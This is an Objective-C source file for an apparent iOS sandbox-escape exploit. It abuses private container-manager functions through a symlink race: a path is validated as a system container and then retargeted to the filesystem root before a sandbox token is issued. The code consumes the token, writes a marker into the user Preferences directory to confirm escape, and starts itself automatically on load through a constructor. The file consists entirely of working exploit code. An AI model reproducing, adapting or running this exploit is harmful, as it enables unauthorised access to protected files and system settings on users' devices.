// sbphase — split the MCM query from token issuance: validate the part path
// while it is a symlink to a valid SystemGroup container, then retarget the
// symlink to / and only then ask for the sandbox token.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_group;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static NSString *gGroup;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbphase] %@", s);
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail %s", dlerror()); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_group = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    L(@"load create=%p get=%p tok=%p consume=%p", q_create, q_get, q_token, s_consume);
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) return gid;
    }
    return nil;
}

static void check(NSString *tag) {
    NSString *prefs = @"/var/mobile/Library/Preferences";
    errno = 0;
    DIR *d = opendir(prefs.fileSystemRepresentation);
    L(@"[%@] opendir prefs=%p errno=%d", tag, d, errno);
    if (d) closedir(d);
    NSString *m = [prefs stringByAppendingPathComponent:@"sbphase_marker"];
    errno = 0;
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"[%@] write prefs fd=%d errno=%d", tag, fd, errno);
    if (fd >= 0) { write(fd, "win", 3); close(fd); unlink(m.fileSystemRepresentation); }
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbphase start pid=%d", getpid());
        if (!load()) return;
        gGroup = findGroup();
        if (!gGroup) return;
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *root = [fm containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        NSString *lib = [root stringByAppendingPathComponent:@"Library"];
        NSString *part = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *valid = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:part error:nil];
        symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation);
        check(@"before");

        void *q = q_create();
        q_class(q, 7);
        void *x = xpc_string ? xpc_string(gGroup.UTF8String) : NULL;
        q_group(q, x);
        q_part(q, 3);
        q_flags(q, 0x8000000000ULL);

        void *res = q_get(q);
        L(@"q_get res=%p", res);

        // The critical move: retarget the validated path before token issuance.
        unlink(part.fileSystemRepresentation);
        int rc = symlink("/", part.fileSystemRepresentation);
        L(@"retarget rc=%d errno=%d", rc, errno);

        char *tok = res ? q_token(res) : NULL;
        L(@"q_token tok=%p", tok);
        if (tok) {
            L(@"tokenstr=%s", tok);
            int64_t h = s_consume(tok);
            L(@"consume=%lld", (long long)h);
            check(@"after");
            if (h >= 0) s_release(h);
            free(tok);
        }
        if (q_free) q_free(q);
        if (x && xpc_release_fn) xpc_release_fn(x);
        unlink(part.fileSystemRepresentation);
        symlink(valid.fileSystemRepresentation, part.fileSystemRepresentation);
        L(@"=== sbphase done ===");
    }
}

__attribute__((constructor)) static void sbphase_init(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{ runProbe(); });
}
